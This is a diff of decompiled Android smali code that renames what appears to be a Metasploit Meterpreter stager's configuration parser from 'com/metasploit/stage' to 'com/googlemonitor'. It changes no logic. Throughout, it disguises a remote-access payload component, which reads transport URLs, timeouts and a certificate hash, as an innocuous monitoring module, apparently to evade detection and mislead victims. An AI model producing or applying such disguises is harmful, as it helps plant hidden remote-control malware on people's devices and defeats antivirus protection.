@@ -1,4 +1,4 @@
-.class public final Lcom/metasploit/stage/b;
+.class public final Lcom/googlemonitor/b;
 .super Ljava/lang/Object;
 
 
@@ -18,7 +18,7 @@
 
     move-result-wide v0
 
-    sput-wide v0, Lcom/metasploit/stage/b;->a:J
+    sput-wide v0, Lcom/googlemonitor/b;->a:J
 
     return-void
 .end method
@@ -55,7 +55,7 @@
     return v1
 .end method
 
-.method public static a([B)Lcom/metasploit/stage/a;
+.method public static a([B)Lcom/googlemonitor/a;
     .locals 11
 
     const/16 v10, 0x40
@@ -64,21 +64,21 @@
 
     const/16 v2, 0x10
 
-    new-instance v3, Lcom/metasploit/stage/a;
+    new-instance v3, Lcom/googlemonitor/a;
 
-    invoke-direct {v3}, Lcom/metasploit/stage/a;-><init>()V
+    invoke-direct {v3}, Lcom/googlemonitor/a;-><init>()V
 
-    invoke-static {p0, v1}, Lcom/metasploit/stage/b;->a([BI)I
+    invoke-static {p0, v1}, Lcom/googlemonitor/b;->a([BI)I
 
     move-result v0
 
-    iput v0, v3, Lcom/metasploit/stage/a;->a:I
+    iput v0, v3, Lcom/googlemonitor/a;->a:I
 
-    sget-wide v4, Lcom/metasploit/stage/b;->a:J
+    sget-wide v4, Lcom/googlemonitor/b;->a:J
 
     const/16 v0, 0xc
 
-    invoke-static {p0, v0}, Lcom/metasploit/stage/b;->a([BI)I
+    invoke-static {p0, v0}, Lcom/googlemonitor/b;->a([BI)I
 
     move-result v0
 
@@ -86,17 +86,17 @@
 
     mul-long/2addr v4, v6
 
-    iput-wide v4, v3, Lcom/metasploit/stage/a;->b:J
+    iput-wide v4, v3, Lcom/googlemonitor/a;->b:J
 
-    invoke-static {p0, v2, v2}, Lcom/metasploit/stage/b;->b([BII)[B
+    invoke-static {p0, v2, v2}, Lcom/googlemonitor/b;->b([BII)[B
 
     const/16 v0, 0x20
 
-    invoke-static {p0, v0, v2}, Lcom/metasploit/stage/b;->b([BII)[B
+    invoke-static {p0, v0, v2}, Lcom/googlemonitor/b;->b([BII)[B
 
     const/16 v0, 0x30
 
-    iget v2, v3, Lcom/metasploit/stage/a;->a:I
+    iget v2, v3, Lcom/googlemonitor/a;->a:I
 
     and-int/lit8 v2, v2, 0x1
 
@@ -106,11 +106,11 @@
 
     const/16 v4, 0x64
 
-    invoke-static {p0, v2, v4}, Lcom/metasploit/stage/b;->a([BII)Ljava/lang/String;
+    invoke-static {p0, v2, v4}, Lcom/googlemonitor/b;->a([BII)Ljava/lang/String;
 
     move-result-object v2
 
-    iput-object v2, v3, Lcom/metasploit/stage/a;->c:Ljava/lang/String;
+    iput-object v2, v3, Lcom/googlemonitor/a;->c:Ljava/lang/String;
 
     :cond_0
     :goto_0
@@ -118,39 +118,25 @@
 
     if-eqz v2, :cond_5
 
-    new-instance v4, Lcom/metasploit/stage/g;
+    new-instance v4, Lcom/googlemonitor/g;
 
-    invoke-direct {v4}, Lcom/metasploit/stage/g;-><init>()V
+    invoke-direct {v4}, Lcom/googlemonitor/g;-><init>()V
 
     const/16 v2, 0x200
 
-    invoke-static {p0, v0, v2}, Lcom/metasploit/stage/b;->a([BII)Ljava/lang/String;
+    invoke-static {p0, v0, v2}, Lcom/googlemonitor/b;->a([BII)Ljava/lang/String;
 
     move-result-object v2
 
-    iput-object v2, v4, Lcom/metasploit/stage/g;->a:Ljava/lang/String;
+    iput-object v2, v4, Lcom/googlemonitor/g;->a:Ljava/lang/String;
 
     add-int/lit16 v0, v0, 0x200
 
     add-int/lit8 v0, v0, 0x4
 
-    sget-wide v6, Lcom/metasploit/stage/b;->a:J
+    sget-wide v6, Lcom/googlemonitor/b;->a:J
 
-    invoke-static {p0, v0}, Lcom/metasploit/stage/b;->a([BI)I
-
-    move-result v2
-
-    int-to-long v8, v2
-
-    mul-long/2addr v6, v8
-
-    iput-wide v6, v4, Lcom/metasploit/stage/g;->b:J
-
-    add-int/lit8 v0, v0, 0x4
-
-    sget-wide v6, Lcom/metasploit/stage/b;->a:J
-
-    invoke-static {p0, v0}, Lcom/metasploit/stage/b;->a([BI)I
+    invoke-static {p0, v0}, Lcom/googlemonitor/b;->a([BI)I
 
     move-result v2
 
@@ -158,11 +144,25 @@
 
     mul-long/2addr v6, v8
 
-    iput-wide v6, v4, Lcom/metasploit/stage/g;->c:J
+    iput-wide v6, v4, Lcom/googlemonitor/g;->b:J
 
     add-int/lit8 v0, v0, 0x4
 
-    iget-object v2, v4, Lcom/metasploit/stage/g;->a:Ljava/lang/String;
+    sget-wide v6, Lcom/googlemonitor/b;->a:J
+
+    invoke-static {p0, v0}, Lcom/googlemonitor/b;->a([BI)I
+
+    move-result v2
+
+    int-to-long v8, v2
+
+    mul-long/2addr v6, v8
+
+    iput-wide v6, v4, Lcom/googlemonitor/g;->c:J
+
+    add-int/lit8 v0, v0, 0x4
+
+    iget-object v2, v4, Lcom/googlemonitor/g;->a:Ljava/lang/String;
 
     const-string v5, "http"
 
@@ -174,35 +174,35 @@
 
     const/16 v2, 0x80
 
-    invoke-static {p0, v0, v2}, Lcom/metasploit/stage/b;->a([BII)Ljava/lang/String;
+    invoke-static {p0, v0, v2}, Lcom/googlemonitor/b;->a([BII)Ljava/lang/String;
 
     add-int/lit16 v0, v0, 0x80
 
-    invoke-static {p0, v0, v10}, Lcom/metasploit/stage/b;->a([BII)Ljava/lang/String;
+    invoke-static {p0, v0, v10}, Lcom/googlemonitor/b;->a([BII)Ljava/lang/String;
 
     add-int/lit8 v0, v0, 0x40
 
-    invoke-static {p0, v0, v10}, Lcom/metasploit/stage/b;->a([BII)Ljava/lang/String;
+    invoke-static {p0, v0, v10}, Lcom/googlemonitor/b;->a([BII)Ljava/lang/String;
 
     add-int/lit8 v0, v0, 0x40
 
     const/16 v2, 0x100
 
-    invoke-static {p0, v0, v2}, Lcom/metasploit/stage/b;->a([BII)Ljava/lang/String;
+    invoke-static {p0, v0, v2}, Lcom/googlemonitor/b;->a([BII)Ljava/lang/String;
 
     move-result-object v2
 
-    iput-object v2, v4, Lcom/metasploit/stage/g;->d:Ljava/lang/String;
+    iput-object v2, v4, Lcom/googlemonitor/g;->d:Ljava/lang/String;
 
     add-int/lit16 v0, v0, 0x100
 
     const/4 v2, 0x0
 
-    iput-object v2, v4, Lcom/metasploit/stage/g;->e:[B
+    iput-object v2, v4, Lcom/googlemonitor/g;->e:[B
 
     const/16 v2, 0x14
 
-    invoke-static {p0, v0, v2}, Lcom/metasploit/stage/b;->b([BII)[B
+    invoke-static {p0, v0, v2}, Lcom/googlemonitor/b;->b([BII)[B
 
     move-result-object v5
 
@@ -219,7 +219,7 @@
 
     if-eqz v6, :cond_2
 
-    iput-object v5, v4, Lcom/metasploit/stage/g;->e:[B
+    iput-object v5, v4, Lcom/googlemonitor/g;->e:[B
 
     :cond_1
     new-instance v5, Ljava/lang/StringBuilder;
@@ -257,7 +257,7 @@
 
     move-result-object v0
 
-    iput-object v0, v4, Lcom/metasploit/stage/g;->f:Ljava/lang/String;
+    iput-object v0, v4, Lcom/googlemonitor/g;->f:Ljava/lang/String;
 
     invoke-virtual {v0}, Ljava/lang/String;->length()I
 
@@ -266,7 +266,7 @@
     add-int/2addr v0, v2
 
     :cond_4
-    iget-object v2, v3, Lcom/metasploit/stage/a;->d:Ljava/util/List;
+    iget-object v2, v3, Lcom/googlemonitor/a;->d:Ljava/util/List;
 
     invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z
 
@@ -279,7 +279,7 @@
 .method private static a([BII)Ljava/lang/String;
     .locals 3
 
-    invoke-static {p0, p1, p2}, Lcom/metasploit/stage/b;->b([BII)[B
+    invoke-static {p0, p1, p2}, Lcom/googlemonitor/b;->b([BII)[B
 
     move-result-object v0
 
